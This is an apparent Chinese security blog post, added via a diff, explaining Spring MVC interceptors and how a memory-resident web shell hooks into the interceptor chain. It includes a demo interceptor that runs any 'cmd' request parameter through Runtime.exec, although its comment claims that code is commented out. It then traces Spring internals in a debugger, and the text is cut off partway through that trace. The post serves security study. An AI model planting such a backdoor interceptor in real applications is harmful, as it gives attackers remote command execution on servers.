@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置&#x2F;后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之Spring Interceptor内存马">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/25/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置&#x2F;后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028161434167.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028161453250.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028193921739.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028194827883.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028195015546.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028195157217.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028195652513.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028202050461.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20251028204953732.png">
+<meta property="article:published_time" content="2025-10-25T09:12:11.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:33:17.321Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20251028161434167.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/25/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/25/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2025/10/25/Java攻防/Java安全之Spring-Interceptor内存马/","title":"Java安全之Spring Interceptor内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之Spring Interceptor内存马 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Spring Interceptor内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-Interceptor%EF%BC%88%E6%8B%A6%E6%88%AA%E5%99%A8%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">Spring Interceptor（拦截器）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA"><span class="nav-number">1.2.</span> <span class="nav-text">代码演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%BB%BA%E9%A1%B9%E7%9B%AE"><span class="nav-number">1.2.1.</span> <span class="nav-text">新建项目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E6%8E%A5%E5%8F%A3"><span class="nav-number">1.2.2.</span> <span class="nav-text">实现接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.3.</span> <span class="nav-text">注册使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">调试分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.4.</span> <span class="nav-text">编写内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E4%BA%86%E8%A7%A3"><span class="nav-number">1.4.1.</span> <span class="nav-text">前置了解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E5%8F%82%E4%B8%8E%E6%AF%8F%E4%B8%80%E6%AC%A1%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">必须参与每一次请求处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E8%BF%9B%E5%85%A5-HandlerExecutionChain"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">必须进入 HandlerExecutionChain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E5%9C%A8-adaptedInterceptors-%E4%B8%AD"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">必须在 adaptedInterceptors 中</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E6%8B%BF%E5%88%B0%E6%8C%81%E6%9C%89%E5%AE%83%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">必须拿到持有它的实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E9%80%9A%E8%BF%87-WebApplicationContext"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">必须通过 WebApplicationContext</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-number">1.4.2.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">1.4.3.</span> <span class="nav-text">完整代码</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/25/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之Spring Interceptor内存马 | 子非鱼的博客">
+      <meta itemprop="description" content="Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置&#x2F;后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流程。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之Spring Interceptor内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-25 17:12:11" itemprop="dateCreated datePublished" datetime="2025-10-25T17:12:11+08:00">2025-10-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:33:17" itemprop="dateModified" datetime="2025-10-31T17:33:17+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Spring Interceptor内存马是通过动态注册恶意拦截器（Interceptor）到Spring MVC框架的拦截器链中，无需落地文件，利用其对Controller请求的前置/后置拦截机制，在请求处理的全过程中执行恶意代码（如命令执行、数据窃取等），通常通过反射操作Spring的HandlerInterceptorRegistry等组件完成注册，隐蔽性强且能持续监控和干预所有匹配的请求流程。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1>Spring Interceptor内存马</h1>
+<h2 id="Spring-Interceptor（拦截器）">Spring Interceptor（拦截器）</h2>
+<p><strong>1. 是什么？</strong></p>
+<p>Spring Interceptor 是 Spring MVC 框架提供的一个机制，用于在请求处理的特定阶段（如进入控制器方法前、渲染视图后等）执行自定义逻辑。它类似于 Servlet 的 Filter，但作用于更上层的 MVC 流程中，由 Spring 容器管理。</p>
+<p><strong>2. 核心接口：<code>HandlerInterceptor</code></strong></p>
+<p>开发者需要实现 <code>org.springframework.web.servlet.HandlerInterceptor</code> 接口，并重写以下三个方法：</p>
+<ul>
+<li><code>preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)</code>
+<ul>
+<li>在控制器方法<strong>执行前</strong>调用。</li>
+<li>返回值为boolean：
+<ul>
+<li><code>true</code>: 继续执行后续的拦截器和控制器方法。</li>
+<li><code>false</code>: 中断流程，不再执行后续操作（通常在此处进行权限校验、日志记录、参数预处理等）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</code>
+<ul>
+<li>在控制器方法<strong>执行完毕后</strong>，但在<strong>视图渲染前</strong>调用。</li>
+<li>可以对 <code>ModelAndView</code> 对象进行修改或添加额外数据。</li>
+</ul>
+</li>
+<li><code>afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</code>
+<ul>
+<li>在整个请求完成（包括视图渲染）后调用。</li>
+<li>主要用于资源清理工作，无论是否发生异常都会执行。</li>
+</ul>
+</li>
+</ul>
+<p><strong>3. 注册与使用</strong></p>
+<p>通过实现 <code>WebMvcConfigurer</code> 接口并重写 <code>addInterceptors</code> 方法来注册拦截器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// 添加自定义拦截器，并指定拦截路径</span></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">MyCustomInterceptor</span>())</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/api/**&quot;</span>) <span class="comment">// 拦截所有 /api/ 开头的请求</span></span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/api/public/**&quot;</span>); <span class="comment">// 排除公共接口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>4. 典型应用场景</strong></p>
+<ul>
+<li><strong>身份认证与授权</strong>：检查用户登录状态和权限。</li>
+<li><strong>日志记录</strong>：记录请求信息、耗时等。</li>
+<li><strong>性能监控</strong>：统计接口响应时间。</li>
+<li><strong>跨域处理</strong>：统一设置 CORS 头。</li>
+<li><strong>参数预处理/后处理</strong>：如解密、加密、数据格式化。</li>
+</ul>
+<h2 id="代码演示">代码演示</h2>
+<h3 id="新建项目">新建项目</h3>
+<p><img src="/images/image-20251028161434167.png" alt="image-20251028161434167"></p>
+<p><img src="/images/image-20251028161453250.png" alt="image-20251028161453250"></p>
+<p>Spring的版本不同, 内存马注入所依赖的类不同, 此处以2.4.2为例</p>
+<h3 id="实现接口">实现接口</h3>
+<p>在目录下新建类<code>TestInterceptor</code>实现<code>HandlerInterceptor</code>接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.interceptordemo.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;preHandle&quot;</span>);</span><br><span class="line">        <span class="comment">// 注释掉危险的命令执行代码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="注册使用">注册使用</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.interceptordemo.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>()).addPathPatterns(<span class="string">&quot;/int&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>新建类<code>WebConfig</code>类实现<code>WebMvcConfigurer</code>接口, 注册<code>interveptor</code>.</p>
+<p>然后启动项目, 访问<code>/int?cmd=calc</code>就会弹出计算器.</p>
+<h2 id="调试分析">调试分析</h2>
+<p>在<code>TestInterceptor</code>类中打上断点,</p>
+<p><img src="/images/image-20251028193921739.png" alt="image-20251028193921739"></p>
+<p>启动项目后访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/int?cmd=calc">http://127.0.0.1:8080/int?cmd=calc</a>, 然后开始调试,</p>
+<p><img src="/images/image-20251028194827883.png" alt="image-20251028194827883"></p>
+<p>查看他先前执行的堆栈.</p>
+<p><img src="/images/image-20251028195015546.png" alt="image-20251028195015546"></p>
+<p>点到<code>DispatcherServlet</code>中, 查看变量</p>
+<p><img src="/images/image-20251028195157217.png" alt="image-20251028195157217"></p>
+<p><code>mappedHandler</code>中有我们注册的拦截器<code>TestInterceptor</code></p>
+<p>往上翻, 查看mappedHandler的定义和赋值, 分别在</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ................</span><br><span class="line">        <span class="type">HandlerExecutionChain</span> <span class="variable">mappedHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        ................</span><br><span class="line">        mappedHandler = <span class="built_in">this</span>.getHandler(processedRequest);            </span><br></pre></td></tr></table></figure>
+<p>在赋值的位置再打一个断点, 重新启动项目访问路径继续分析</p>
+<p><img src="/images/image-20251028195652513.png" alt="image-20251028195652513"></p>
+<p>步入进去<code>this.getHandler</code>, 来到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">  <span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span>(HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line">              <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">              <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> handler;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码的作用是为HTTP请求找到合适的处理器（Handler）：</p>
+<ul>
+<li>
+<p>遍历<code>HandlerMapping</code>列表：<code>this.handlerMappings</code>包含了所有已注册的<code>HandlerMapping</code>对象，这些对象负责将请求URL映射到具体的处理器方法。</p>
+</li>
+<li>
+<p>查找匹配的处理器：对于每个<code>HandlerMapping</code>，调用其<code>getHandler(request)</code>方法尝试获取能够处理当前请求的处理器。</p>
+</li>
+<li>
+<p>返回处理器执行链：如果找到合适的处理器，<code>HandlerMapping</code>会返回一个<code>HandlerExecutionChain</code>对象，其中包含了：</p>
+<ul>
+<li>
+<p>实际的处理器（Controller方法）</p>
+</li>
+<li>
+<p>应用于该请求的所有拦截器（Interceptors）</p>
+</li>
+</ul>
+</li>
+<li>
+<p>短路返回：一旦找到匹配的处理器，立即返回，不再继续遍历其他HandlerMapping。</p>
+</li>
+<li>
+<p>未找到处理器返回null：如果遍历完所有HandlerMapping都没有找到匹配的处理器，则返回null。</p>
+</li>
+</ul>
+<p>继续步入调式, 当执行到第五次循环的时候, 就会执行到<code>AbstractHandlerMapping</code>类的<code>HandlerExecutionChain</code>方法中的<code>this.getHandlerExecutionChain</code>这一步</p>
+<p><img src="/images/image-20251028202050461.png" alt="image-20251028202050461"></p>
+<p>步入<code>getHandlerExecutionChain</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> &#123;</span><br><span class="line">       <span class="type">HandlerExecutionChain</span> <span class="variable">chain</span> <span class="operator">=</span> handler <span class="keyword">instanceof</span> HandlerExecutionChain ? (HandlerExecutionChain)handler : <span class="keyword">new</span> <span class="title class_">HandlerExecutionChain</span>(handler);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span>(HandlerInterceptor interceptor : <span class="built_in">this</span>.adaptedInterceptors) &#123;</span><br><span class="line">           <span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line">               <span 